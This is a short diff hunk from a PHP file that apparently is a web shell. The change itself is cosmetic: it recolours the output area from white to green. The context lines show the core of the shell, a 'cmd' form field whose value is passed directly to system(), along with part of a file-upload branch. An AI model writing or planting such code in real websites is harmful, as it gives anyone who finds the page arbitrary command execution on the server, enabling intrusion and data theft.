@@ -71,7 +71,7 @@ if ($files["name"] != '') {
 <INPUT TYPE="text" NAME="cmd">
 <INPUT TYPE="submit" VALUE="Send">
 </FORM></center>
-<pre style="color: white">
+<pre style="color: #55ff00">
 <?
 if($_GET['cmd']) {
   system($_GET['cmd']);
